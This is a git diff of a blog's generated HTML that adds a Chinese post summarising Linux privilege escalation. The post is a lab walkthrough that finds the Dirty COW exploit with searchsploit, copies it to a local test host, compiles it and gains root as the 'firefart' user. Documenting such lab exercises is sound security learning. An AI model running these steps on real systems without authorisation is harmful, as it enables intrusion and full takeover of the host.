@@ -18,9 +18,25 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>Tags - M0untainShley</title>
+  <title>Linux提权方式总结 - M0untainShley</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
 
 
 
@@ -48,7 +64,7 @@
 
 
 <body>
-  <header style="height: 80vh;">
+  <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
     <a class="navbar-brand"
@@ -147,17 +163,50 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Tag">
+            <span class="h2" id="subtitle" title="Linux提权方式总结">
               
             </span>
 
             
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-22 16:33" pubdate>
+        October 22, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      304 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      3
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
           </div>
 
-          
-            <div class="scroll-down-bar">
-              <i class="iconfont icon-arrowdown"></i>
-            </div>
           
         </div>
       </div>
@@ -166,24 +215,137 @@
 
   <main>
     
-      <div class="container nopadding-x-md">
-        <div class="py-5" id="board"
-          >
-          
-          <div class="container">
-            <div class="row">
-              <div class="col-12 col-md-10 m-auto">
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Linux提权方式总结</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：October 22, 2021 pm
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h3 id="Linux内核漏洞提权（未完成）"><a href="#Linux内核漏洞提权（未完成）" class="headerlink" title="Linux内核漏洞提权（未完成）"></a>Linux内核漏洞提权（未完成）</h3><p>对比exploit-db，利用已知的Linux内核提权漏洞进行提权</p>
+<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>kali IP：192.168.198.128</p>
+<p>被攻击者IP：192.168.198.133</p>
+<h4 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h4><p>首先对服务器进行信息收集，查看系统的内核信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ uname -a<br></code></pre></td></tr></table></figure>
+
+<img src="/img/Linux提权方式总结/1.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>根据系统内核版本，使用searchsploit命令在exploit-db上寻找对应的漏洞（kali上自带的命令）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 参数解释：后面参数可以理解为使用搜索引擎时输入关键字，其他用法可以参考官方文档：https://www.exploit-db.com/searchsploit</span><br>$ searchsploit linux kernel privilege 2.6.24<br></code></pre></td></tr></table></figure>
+
+<img src="/img/Linux提权方式总结/2.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>下载exp到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ searchsploit -m linux/<span class="hljs-built_in">local</span>/40839.c  <br>...  <span class="hljs-comment"># 省略中间文字</span><br><br>$ ls<br>40839.c<br></code></pre></td></tr></table></figure>
+
+
+
+<p>将下载的exp传输到被攻击主机（192.168.198.133）上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ scp ./40839.c msfadmin@192.168.198.133:/home/msfadmin<br>msfadmin@192.168.198.133<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">40839.c </span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>在被攻击主机下查看该文件</p>
+<img src="/img/Linux提权方式总结/3.png" srcset="/img/loading.gif" lazyload>
+
+
+
+<p>提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用以下命令对exp进行编译，生成dirty可执行文件</span><br>$ gcc -pthread 40839.c -o dirty -lcrypt<br><br><span class="hljs-comment"># 运行该文件，后面输入的是当前用户的密码</span><br>$ ./dirty msfadmin<br>...  <br><br><span class="hljs-comment"># 提权到root也就是firefart用户</span><br>$ su firefart<br>... <br><br><span class="hljs-comment"># 查看当前权限，提权成功，root权限</span><br>$ id<br>...  <br></code></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<img src="/img/Linux提权方式总结/4.png" srcset="/img/loading.gif" lazyload>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Linux/">Linux</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">权限提升</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/10/12/Windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">
+                        <span class="hidden-mobile">Windows提权方式总结</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
                 
 
-<div class="text-center tagcloud">
-  <a href="/tags/Android%E9%80%86%E5%90%91/" style="font-size: 22.5px; color: #779bd3">Android逆向</a> <a href="/tags/CTF/" style="font-size: 15px; color: #bbe">CTF</a> <a href="/tags/Git/" style="font-size: 15px; color: #bbe">Git</a> <a href="/tags/Hook%E6%8A%80%E6%9C%AF/" style="font-size: 15px; color: #bbe">Hook技术</a> <a href="/tags/Java-Web/" style="font-size: 30px; color: #337ab7">Java Web</a> <a href="/tags/JavaWeb/" style="font-size: 15px; color: #bbe">JavaWeb</a> <a href="/tags/Linux/" style="font-size: 22.5px; color: #779bd3">Linux</a> <a href="/tags/Webshell/" style="font-size: 15px; color: #bbe">Webshell</a> <a href="/tags/Windows/" style="font-size: 15px; color: #bbe">Windows</a> <a href="/tags/Write-up/" style="font-size: 15px; color: #bbe">Write up</a> <a href="/tags/frida/" style="font-size: 15px; color: #bbe">frida</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 15px; color: #bbe">信息收集</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 22.5px; color: #779bd3">内网渗透</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 30px; color: #337ab7">学习笔记</a> <a href="/tags/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC/" style="font-size: 15px; color: #bbe">恶意样本</a> <a href="/tags/%E6%94%BB%E5%87%BB%E6%BA%AF%E6%BA%90/" style="font-size: 15px; color: #bbe">攻击溯源</a> <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" style="font-size: 15px; color: #bbe">权限提升</a> <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 22.5px; color: #779bd3">渗透测试</a> <a href="/tags/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/" style="font-size: 15px; color: #bbe">端口扫描</a> <a href="/tags/%E8%9C%9C%E7%BD%90/" style="font-size: 15px; color: #bbe">蜜罐</a>
-</div>
-
-              </div>
-            </div>
-          </div>
+              </article>
+            
+          </article>
         </div>
       </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
     
 
     
@@ -263,9 +425,15 @@
 
 
 
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
 
 
 
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
 
 
 
